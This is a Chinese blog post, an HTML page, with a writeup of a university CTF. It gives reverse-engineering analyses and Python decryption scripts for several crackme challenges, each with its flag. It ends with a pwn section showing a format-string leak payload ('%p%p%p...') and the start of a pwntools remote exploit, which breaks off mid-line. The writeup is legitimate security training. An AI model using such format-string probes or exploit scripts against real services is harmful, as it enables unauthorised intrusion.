@@ -1,0 +1,1281 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/ESE.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/ESE1.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ESE's Note" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="这次比赛，自己出题自己做的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="全球某工商第二届writeup">
+<meta property="og:url" content="http://yoursite.com/2018/05/07/wp_2018_5_7_zjgsctf/index.html">
+<meta property="og:site_name" content="ESE&#39;s Note">
+<meta property="og:description" content="这次比赛，自己出题自己做的。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/MOVjxQj.png">
+<meta property="og:image" content="https://i.imgur.com/6NuWpL4.png">
+<meta property="og:image" content="https://i.imgur.com/50TDEcw.png">
+<meta property="og:image" content="https://i.imgur.com/dVZm0R5.png">
+<meta property="og:image" content="https://i.imgur.com/V3cXdD5.png">
+<meta property="og:image" content="https://i.imgur.com/UOPUdx9.png">
+<meta property="og:image" content="https://i.imgur.com/so6S0G0.png">
+<meta property="og:image" content="https://i.imgur.com/QUw4XAh.png">
+<meta property="og:image" content="https://i.imgur.com/LzGvAH9.png">
+<meta property="og:image" content="https://i.imgur.com/W8NkO10.png">
+<meta property="og:image" content="https://i.imgur.com/RWGrXuM.png">
+<meta property="og:updated_time" content="2018-05-07T03:31:10.050Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="全球某工商第二届writeup">
+<meta name="twitter:description" content="这次比赛，自己出题自己做的。">
+<meta name="twitter:image" content="https://i.imgur.com/MOVjxQj.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '。。',
+      apiKey: '。。。。',
+      indexName: 'search',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/05/07/wp_2018_5_7_zjgsctf/"/>
+
+
+
+
+
+  <title>全球某工商第二届writeup | ESE's Note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ESE's Note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">阅览室</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/07/wp_2018_5_7_zjgsctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ESE's Note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">全球某工商第二届writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-07T09:48:34+08:00">
+                2018-05-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp/" itemprop="url" rel="index">
+                    <span itemprop="name">wp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/05/07/wp_2018_5_7_zjgsctf/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/05/07/wp_2018_5_7_zjgsctf/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+          作者：ESE
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这次比赛，自己出题自己做的。<br><a id="more"></a></p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="签到题-有名为送分题"><a href="#签到题-有名为送分题" class="headerlink" title="签到题(有名为送分题)"></a>签到题(有名为送分题)</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，发现是文本，直接打开，发现加密函数被写成汇编啦，读汇编就可以知道逻辑结构。即知道是将每一个与或0x30后加1，写出加密算法即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">enc=<span class="string">"\x55\x5b\x50\x56\x4a\x66\x54\x5b\x52\x5e\x5c\x54\x6e\x43\x1f\x6e\x41\x54\x6e\x43\x57\x58\x42\x6e\x58\x42\x6e\x5e\x5d\x5b\x48\x6e\x50\x42\x5c\x4c"</span></div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</div><div class="line">	s += chr((ord(enc[i])^<span class="number">0x30</span>)+<span class="number">1</span>)</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure></p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>flag{Welcome_t0_re_this_is_only_asm}</p>
+<h3 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h3><p>现实工作中，汇编还是需要熟练的，这道题主要是为了考察看汇编的能力。</p>
+<h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，先查壳，发现没有壳，直接运行，输入flag返回是否正确，先拖入ida里。找到主函数f5发现不能反汇编成伪代码，发现栈不平衡，无法解析，这里可以patch，参考:<a href="https://esebanana.github.io/2018/03/26/re_ida/" target="_blank" rel="external">https://esebanana.github.io/2018/03/26/re_ida/</a><br><img src="https://i.imgur.com/MOVjxQj.png" alt=""><br>发现是input先base64加密，在进行rc4加密，最后进行硬编码比较,写出解密代码(我是在kali里运行的，外面的环境不好配置):<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf8</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</div><div class="line"><span class="keyword">import</span>  base64</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">print</span> <span class="string">'ARC4------------------------------------'</span></div><div class="line">key=<span class="string">'flag&#123;this_is_not_the_flag_hahaha&#125;'</span></div><div class="line">enc=<span class="string">"\x20\xc3\x1a\xae\x97\x3c\x7a\x41\xde\xf6\x78\x15\xcb\x4b\x4c\xdc\x26\x55\x8b\x55\xe5\xe9\x55\x75\x40\x3d\x82\x13\xa5\x60\x13\x3b\xf5\xd8\x19\x0e\x47\xcf\x5f\x5e\xde\x9d\x14\xbd"</span></div><div class="line">ob2=ARC4.new(key)</div><div class="line">enc1=ob2.decrypt(enc)</div><div class="line"><span class="keyword">print</span> enc1</div><div class="line"><span class="keyword">print</span> base64.b64decode(enc1)</div></pre></td></tr></table></figure></p>
+<p>发现bese64解出来是乱码，回去看ck1，是base64没有错啊，？？？。最后发送是base64的表被改变啦，再次写出解密代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf8</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</div><div class="line"><span class="keyword">import</span>  base64</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">print</span> <span class="string">'ARC4------------------------------------'</span></div><div class="line">key=<span class="string">'flag&#123;this_is_not_the_flag_hahaha&#125;'</span></div><div class="line">enc=<span class="string">"\x20\xc3\x1a\xae\x97\x3c\x7a\x41\xde\xf6\x78\x15\xcb\x4b\x4c\xdc\x26\x55\x8b\x55\xe5\xe9\x55\x75\x40\x3d\x82\x13\xa5\x60\x13\x3b\xf5\xd8\x19\x0e\x47\xcf\x5f\x5e\xde\x9d\x14\xbd"</span></div><div class="line">ob2=ARC4.new(key)</div><div class="line">enc1=ob2.decrypt(enc)</div><div class="line"><span class="keyword">print</span> enc1</div><div class="line"><span class="keyword">print</span> <span class="string">'base64--------------------------------------'</span></div><div class="line">s=<span class="string">''</span></div><div class="line">Base64=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></div><div class="line">table=    <span class="string">"ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/"</span></div><div class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> enc1:</div><div class="line">	<span class="keyword">if</span> ch <span class="keyword">in</span> Base64:</div><div class="line">		s  = s + Base64[string.find(table,str(ch))]</div><div class="line">	<span class="keyword">elif</span> ch == <span class="string">'='</span>:</div><div class="line">		s = s + <span class="string">'='</span> </div><div class="line"><span class="keyword">print</span> base64.b64decode(s)</div></pre></td></tr></table></figure></p>
+<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>flag{y0u_know_rc4_and_base64_ha$}</p>
+<h3 id="出题思路-1"><a href="#出题思路-1" class="headerlink" title="出题思路"></a>出题思路</h3><p>这道题主要考察选手对常见加密算法的base64和rc4的熟悉程度，故意把函数的栈破坏，导致ida识别失败，同时也考察能对ida的异常进行处理。</p>
+<h2 id="New-driver"><a href="#New-driver" class="headerlink" title="New driver"></a>New driver</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，先查壳，发现有upx壳，这个壳很简单，可以手脱，不过发现用od打开的时候，一运行就退出啦，脱进ida里，发现有tls<br>1、去掉节区里的tls,参考<a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>2、脱下upx壳，<a href="https://esebanana.github.io/2018/03/15/re_tou_ke/" target="_blank" rel="external">https://esebanana.github.io/2018/03/15/re_tou_ke/</a><br>3、可以进行分析啦<br>发现主函数<br><img src="https://i.imgur.com/6NuWpL4.png" alt=""><br>发现有两个线程函数，one和two，后面是一个与enc_flag比较，那主要看看one,two都做了什么加密。<br>分析one:<br><img src="https://i.imgur.com/50TDEcw.png" alt=""><br>一个sleep函数(可能是线程one与线程two替换加密)，还有一个加密函数，进去发现不能f5,这里也patch这个ck1(与babyre方法一样)，最后进行lenn–;<br><img src="https://i.imgur.com/dVZm0R5.png" alt=""><br>发现必须是大写或小写，否者就退出，如果是小写，则将enc=table[enc-38];若为大写，则enc=table[enc-96]<br>分析two：<br>发现只是lenn–<br>那么输入时偶数时不变，奇数是进行加密，写出解密函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">table=<span class="string">"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"</span></div><div class="line">enc=<span class="string">"\x54\x4f\x69\x5a\x69\x5a\x74\x4f\x72\x59\x61\x54\x6f\x55\x77\x50\x6e\x54\x6f\x42\x73\x4f\x61\x4f\x61\x70\x73\x79\x53\x79"</span></div><div class="line">lenn=len(enc)</div><div class="line"><span class="keyword">print</span> lenn</div><div class="line">s=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lenn):</div><div class="line">	<span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</div><div class="line">		s.append(enc[i])</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		k = table.index(enc[i])</div><div class="line">		<span class="keyword">if</span> k&gt;<span class="number">26</span>:</div><div class="line">			s.append(chr(k + <span class="number">38</span>))</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			s.append( chr(k + <span class="number">96</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(s)</div></pre></td></tr></table></figure></p>
+<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>flag{ThisisthreadofwindowshahaIsESE}</p>
+<h3 id="出题思路-2"><a href="#出题思路-2" class="headerlink" title="出题思路"></a>出题思路</h3><p>主要考察简单脱壳，已及PE的文件结构tls,最后考察了对线程的理解和一个简单的加密函数，</p>
+<h2 id="Old-driver"><a href="#Old-driver" class="headerlink" title="Old driver"></a>Old driver</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，先查壳，没有壳，用ida打开<br><img src="https://i.imgur.com/V3cXdD5.png" alt=""><br>发现一个函数地址被与或啦，这里想到smc，可以参考<br><a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>用od打开，运行<br><img src="https://i.imgur.com/UOPUdx9.png" alt=""><br>在这里dump出程序出来，再次ida打开<br><img src="https://i.imgur.com/so6S0G0.png" alt=""><br>前5个必须是flag{,最后必须是}<br>进入ck1，首先发现有验证5-11位的，<br><img src="https://i.imgur.com/QUw4XAh.png" alt=""><br>这里v3不知道，不过我们可以从od里知道v3的数据。接着又是将12-17位进行base64加密在进行比较，接着进入下一个函数<br><img src="https://i.imgur.com/LzGvAH9.png" alt=""><br>这里可以发现是一个迷宫，是用来验证18-39位的，画出迷宫，走出迷宫便可以啦。<br>解密函数如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="comment">#----------------------------</span></div><div class="line">enc1=<span class="string">'flag&#123;'</span></div><div class="line"><span class="comment">#----------------------------</span></div><div class="line">enc2=<span class="string">'\xf2\xee\xef\xf5\xd9\xef'</span></div><div class="line">s=[]</div><div class="line">s.append(enc1)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc2:</div><div class="line">    s.append(chr(ord(x)^<span class="number">0x86</span>))</div><div class="line"><span class="comment">#----------------------------</span></div><div class="line">enc3=<span class="string">'\x63\x31\x39\x7a\x62\x57\x4e\x66'</span></div><div class="line">data=base64.b64decode(enc3)</div><div class="line">s.append(data)</div><div class="line"><span class="comment">#-----------------------------</span></div><div class="line">s.append(<span class="string">'waaaaawwwww22222qqqaaw&#125;'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(s)</div></pre></td></tr></table></figure></p>
+<h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p>flag{this_is_smc_waaaaawwwww22222qqqaaw}</p>
+<h3 id="出题思路-3"><a href="#出题思路-3" class="headerlink" title="出题思路"></a>出题思路</h3><p>这里考察了4层smc，因为smc在恶意软件中经常使用，防免杀。又考察啦od的patch能力，已经base64,走迷宫等</p>
+<h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，发现是elf的，先放进ida里面，代码很简单<br><img src="https://i.imgur.com/W8NkO10.png" alt=""><br>先判断输入的是否是64位，然后fork()一个子进程，然后子进程与父进程进行通信，<br>先看看父进程的加密:<br><img src="https://i.imgur.com/RWGrXuM.png" alt=""><br>发现是一个rot13<br>再来看看子进程<br>发现将父进程加密后的数据读出来，在进行矩阵乘法，最后进行比较，写出解密代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *;</div><div class="line">mat1=[</div><div class="line">[ <span class="number">0x2B</span>, <span class="number">0x16</span>, <span class="number">0x1E</span>, <span class="number">0x53</span>, <span class="number">0x35</span>, <span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">0x29</span> ],</div><div class="line">[ <span class="number">0x35</span>, <span class="number">0x63</span>, <span class="number">0x0A</span>, <span class="number">0x28</span>, <span class="number">0x2C</span>, <span class="number">0x06</span>, <span class="number">0x32</span>, <span class="number">0x2A</span> ],</div><div class="line">[ <span class="number">0x55</span>, <span class="number">0x39</span>, <span class="number">0x14</span>, <span class="number">0x5F</span>, <span class="number">0x20</span>, <span class="number">0x19</span>, <span class="number">0x34</span>, <span class="number">0x21</span> ],</div><div class="line">[ <span class="number">0x19</span>, <span class="number">0x0B</span>, <span class="number">0x5A</span>, <span class="number">0x09</span>, <span class="number">0x50</span>, <span class="number">0x34</span>, <span class="number">0x6F</span>, <span class="number">0x5C</span> ],</div><div class="line">[ <span class="number">0x16</span>, <span class="number">0x1A</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x34</span>, <span class="number">0x4E</span>, <span class="number">0x16</span>, <span class="number">0x45</span> ],</div><div class="line">[ <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x2F</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x28</span>, <span class="number">0x69</span>, <span class="number">0x51</span> ],</div><div class="line">[ <span class="number">0x39</span>, <span class="number">0x44</span>, <span class="number">0x12</span>, <span class="number">0x24</span>, <span class="number">0x0A</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x31</span> ],</div><div class="line">[ <span class="number">0x49</span>, <span class="number">0x3B</span>, <span class="number">0x40</span>, <span class="number">0x3B</span>, <span class="number">0x43</span>, <span class="number">0x28</span>, <span class="number">0x21</span>, <span class="number">0x36</span> ]</div><div class="line">]</div><div class="line">enc=[</div><div class="line">[<span class="number">39430</span>, <span class="number">34714</span>, <span class="number">32196</span>, <span class="number">36639</span>, <span class="number">34988</span>, <span class="number">34059</span>, <span class="number">30813</span>, <span class="number">33326</span>], </div><div class="line">[<span class="number">36796</span>, <span class="number">32617</span>, <span class="number">33253</span>, <span class="number">34580</span>, <span class="number">34162</span>, <span class="number">34694</span>, <span class="number">27284</span>, <span class="number">30462</span>], </div><div class="line">[<span class="number">43121</span>, <span class="number">39454</span>, <span class="number">38526</span>, <span class="number">40343</span>, <span class="number">40267</span>, <span class="number">39622</span>, <span class="number">32312</span>, <span class="number">35938</span>], </div><div class="line">[<span class="number">52554</span>, <span class="number">37142</span>, <span class="number">43063</span>, <span class="number">43360</span>, <span class="number">41895</span>, <span class="number">39806</span>, <span class="number">44188</span>, <span class="number">43934</span>], </div><div class="line">[<span class="number">51532</span>, <span class="number">44412</span>, <span class="number">41672</span>, <span class="number">48518</span>, <span class="number">45549</span>, <span class="number">44436</span>, <span class="number">41365</span>, <span class="number">45032</span>], </div><div class="line">[<span class="number">60785</span>, <span class="number">49721</span>, <span class="number">52606</span>, <span class="number">54361</span>, <span class="number">52991</span>, <span class="number">52156</span>, <span class="number">47474</span>, <span class="number">50031</span>], </div><div class="line">[<span class="number">43050</span>, <span class="number">35311</span>, <span class="number">36031</span>, <span class="number">39633</span>, <span class="number">34447</span>, <span class="number">34470</span>, <span class="number">31270</span>, <span class="number">31954</span>],</div><div class="line">[<span class="number">49152</span>, <span class="number">43386</span>, <span class="number">42096</span>, <span class="number">46024</span>, <span class="number">45029</span>, <span class="number">43961</span>, <span class="number">36733</span>, <span class="number">42762</span>]</div><div class="line">]</div><div class="line"><span class="comment">#矩阵的逆</span></div><div class="line"><span class="comment">#B*A=C</span></div><div class="line"><span class="comment">#B=A1*C</span></div><div class="line">A=mat(mat1)</div><div class="line"><span class="comment">#A的逆矩阵</span></div><div class="line">A1=linalg.inv(A)</div><div class="line">C=mat(enc)</div><div class="line">B1=A1*C</div><div class="line"></div><div class="line">c=B1.tolist()</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">	k=c[j]</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">		kk=int(k[i])+<span class="number">0.5</span></div><div class="line">		<span class="keyword">if</span> k[i]&gt;kk:</div><div class="line">			s=s+chr(int(k[i])+<span class="number">1</span>)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			s=s+chr(int(k[i]))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s)</span>:</span></div><div class="line">	flag=<span class="string">''</span></div><div class="line">	le=len(s)</div><div class="line">	<span class="keyword">for</span> ch <span class="keyword">in</span> s:</div><div class="line">		tmp=ord(ch)+<span class="number">13</span></div><div class="line">		<span class="keyword">if</span> ch.isupper():</div><div class="line">			<span class="keyword">if</span> tmp&gt;<span class="number">90</span>:</div><div class="line">				tmp=tmp<span class="number">-26</span></div><div class="line">		<span class="keyword">elif</span> ch.islower():</div><div class="line">			<span class="keyword">if</span> tmp&gt;<span class="number">122</span>:</div><div class="line">				tmp=tmp<span class="number">-26</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			tmp=ord(ch)		</div><div class="line">		flag +=chr(tmp)</div><div class="line">	<span class="keyword">return</span> flag</div><div class="line"></div><div class="line">s=rot13(s)</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure></p>
+<h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p>flag{y0u_are_g0Od_for_Math_this_is_Matrix_5f0256b0f586a7b55dasd}</p>
+<h3 id="出题思路-4"><a href="#出题思路-4" class="headerlink" title="出题思路"></a>出题思路</h3><p>主要考察进程间的通讯，rot13,和矩阵乘法的运用。</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>这里有全部题目的源代码，解密代码和程序<br>链接：<a href="https://pan.baidu.com/s/1qEr6y0JdqEVI-B9CoIBvqQ" target="_blank" rel="external">https://pan.baidu.com/s/1qEr6y0JdqEVI-B9CoIBvqQ</a> 密码：uziu</p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>这是队友出的题目，自己也去做了做，也发现很有意思</p>
+<h2 id="得到shell"><a href="#得到shell" class="headerlink" title="得到shell"></a>得到shell</h2><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><p>在用户名输入%p%p%p%p%p%p%p%p，发现第一个字符串有特别，用%s输出，发现Bob,密码:随便猜测，发现是123456（当时我随便输了123，就没有猜测啦,用的是第二种方法）</p>
+<h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>exp<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#coding=utf8</span></div><div class="line">from pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span 